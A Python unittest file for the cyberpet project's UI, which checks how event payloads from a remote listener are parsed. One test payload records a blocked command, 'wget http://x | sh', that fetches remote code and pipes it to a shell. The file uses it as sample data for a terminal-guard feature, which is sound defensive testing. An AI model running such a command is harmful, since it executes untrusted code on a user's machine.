"""Tests for UI event payload parsing robustness."""

from __future__ import annotations

import unittest

from cyberpet.events import EventType
from cyberpet.ui.pet import CyberPetApp


class UIEventParsingTests(unittest.TestCase):
    """Validate stream payload parsing used by remote UI listener."""

    def test_valid_payload_parses_event(self) -> None:
        payload = {
            "type": "CMD_BLOCKED",
            "source": "terminal_guard",
            "data": {"command": "wget http://x | sh", "reason": "danger"},
            "severity": 99,
        }
        event = CyberPetApp._event_from_payload(payload)
        self.assertIsNotNone(event)
        assert event is not None
        self.assertEqual(event.type, EventType.CMD_BLOCKED)
        self.assertEqual(event.source, "terminal_guard")
        self.assertEqual(event.data.get("command"), "wget http://x | sh")
        self.assertEqual(event.severity, 99)

    def test_invalid_type_returns_none(self) -> None:
        payload = {"type": "NOT_REAL", "data": {}, "severity": 0}
        event = CyberPetApp._event_from_payload(payload)
        self.assertIsNone(event)

    def test_non_dict_data_is_sanitized(self) -> None:
        payload = {"type": "CMD_ALLOWED", "data": "oops", "severity": "12"}
        event = CyberPetApp._event_from_payload(payload)
        self.assertIsNotNone(event)
        assert event is not None
        self.assertEqual(event.data, {})
        self.assertEqual(event.severity, 12)


if __name__ == "__main__":
    unittest.main()
